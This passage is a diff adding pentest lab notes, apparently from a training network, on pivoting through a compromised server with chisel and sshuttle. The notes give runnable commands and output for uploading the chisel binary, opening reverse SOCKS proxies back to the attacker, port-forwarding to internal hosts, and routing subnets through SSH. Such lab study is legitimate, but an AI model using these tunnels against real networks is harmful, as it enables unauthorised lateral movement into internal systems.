@@ -834,5 +834,236 @@ kali@kali:~$ jobs
 <details>
   <summary>---</summary>
 
+Tool to set up tunnelled proxy / port forward through a compromised system. Dont need SSH access on compromised server.
+
+Download chisel binary from github and transfer to comrpomise webserver
+
+Use scp
+
+`scp -i [KEY] [FILE] user@address:/[PATH to save file]`
+
+```
+scp -i ssh/webserver_id_rsa chisel/chisel_1.7.6_linux_amd64  root@10.200.81.200:/tmp/chisel-Neozer0
+chisel_1.7.6_linux_amd64                                100% 8144KB 677.9KB/s   00:12  
+```
+
+Chisel has two main uses: SOCKS proxy and port forwarding
+```
+./chisel-Neozer0 --help | head -19
+
+  Usage: chisel [command] [--help]
+
+  Version: 1.7.6 (go1.16rc1)
+
+  Commands:
+    server - runs chisel in server mode
+    client - runs chisel in client mode
+
+  Read more:
+    https://github.com/jpillora/chisel
+```
+
+### Reverse SOCKS proxy
+
+This connects back from compromised server to a listener on attacking machine
+
+Attacking machine
+
+```
+./chisel server -p LISTEN_PORT --reverse &
+```
+
+Compromised host
+```
+./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+```
+
+`R:socks` - remotes
+
+Example
+
+Attacking machine
+```
+kali@kali:~/thm/wreath$ chisel/chisel_1.7.6_linux_amd64 server -p 1337 --reverse &
+[1] 8176
+kali@kali:~/thm/wreath$ 2021/04/07 05:35:30 server: Reverse tunnelling enabled
+2021/04/07 05:35:30 server: Fingerprint N8c7Wp59pZ7WNPRo4aVUU4MlhLOeauxzPIrIpMpfpZQ=
+2021/04/07 05:35:30 server: Listening on http://0.0.0.0:1337
+2021/04/07 05:37:12 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```
+
+Notice proxy opened on 127.0.0.1:1080 - this is where we will send data through the proxy
+
+
+Compromised host
+```
+[root@prod-serv tmp]# ./chisel-Neozer0 client 10.50.82.56:1337 R:socks &
+[2] 2076
+[root@prod-serv tmp]# 2021/04/07 10:37:11 client: Connecting to ws://10.50.82.56:1337
+2021/04/07 10:37:13 client: Connected (Latency 262.021143ms)
+```
+
+### Forward SOCKS proxy
+
+Less common than reverse proxies.
+Like bind shells are less common than reverse shells.
+
+Egress firewalls are less stringent than ingress firewalls
+
+Compromised host
+```
+./chisel server -p LISTEN_PORT --socks5
+```
+
+Attacking box
+```
+./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+```
+
+`PROXY_PORT` - port opened for proxy
+
+Example
+```
+./chisel client 172.16.0.10:8080 1337:socks
+```
+
+Connect to a chisel server running on port 8080 of 172.16.0.10.
+SOCKS proxy would open on port 1337 of attacking machine
+
+> Note: Proxychains config needs to be updated to SOCKS5 proxy to work with Chisel
+
+```
+[ProxyList]
+# add proxy here ...
+# meanwhile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
+```
+
+### Remote port forward
+
+Connect back from compromised target to create the forward
+
+Attacking box
+```
+./chisel server -p LISTEN_PORT --reverse &
+```
+
+Compromised server
+```
+./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+```
+
+`LISTEN_PORT` - port chisel server start on
+
+`LOCAL_PORT` - port open on our attacking machine linked to target port
+
+Example
+
+Attacking box: 172.16.0.20
+Compromised server: 172.16.0.5
+Target: 172.16.0.10:22
+
+To forward 172.16.0.10:22 back to port 2222 on attacking machine
+```
+./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
+```
+
+Attacking box
+```
+./chisel server -p 1337 --reverse &
+```
+
+This would allow access to 172.16.10:22 via SSH by navigating to 127.0.0.1:2222
+
+### Local port forward
+
+Connect from attacking machine to chisel server listening on a compromised target
+
+Compromised target
+```
+./chisel server -p LISTEN_PORT
+```
+
+Attacking box
+```
+./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+```
+
+Example
+
+Connect to 172.16.0.5:8000 (compromised host running chisel), forwarding our local port 2222 to 172.16.0.10:22 (intended target)
+```
+./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
+```
+
+> ./chisel client 172.16.0.100:3306 R:socks:172.16.0.200:1337 &
+
+</details>
+
+## 11. Pivoting - sshuttle
+
+<details>
+  <summary>---</summary>
+
+- Uses SSH connection to create tunnelled proxy that acts like a new interface.
+- Simulates a VPN
+- Route traffice through proxy without using proxychains
+- Encrypted connection
+- Sits in the background and forward relevant traffic to target network
+
+However
+- Only works on Linux targets
+- Requires access to compromised server via SSH
+- Requires Python
+
+1. Install sshuttle
+
+`sshuttle -r username@address subnet`
+
+2. Run sshuttle
+
+eg: `sshuttle -r user@172.16.0.5 172.16.0.0/24`
+
+We can avoid specifying subnet with `-N`. Not always successful.
+
+`sshuttle -r username@address -N`
+
+We also need to append `&`
+
+Then enter username and password
+
+Successful response:
+
+`c: Connected to server.`
+
+3. Run sshuttle with key based auth
+
+Use `--ssh-cmd` switch followed by `ssh -i keyfile`
+
+`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`
+
+eg. `sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`
+
+> Note: error may occur if it is part of subnet you are trying to access
+
+```
+client: Connected.
+client_loop: send disconnect: Broken pipe
+client: fatal: server died with error code 255
+```
+
+ie. connecting to `172.16.0.5` and forward `172.16.0.0/24`. Including compromised server inside the newly forwarded subnet
+
+We can get around this with `-x` to create connection without disrupting itself
+
+eg. `sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`
+
+</details>
+
+## 12. Pivoting - Conclusion
+
+<details>
+  <summary>---</summary>
 
 </details>
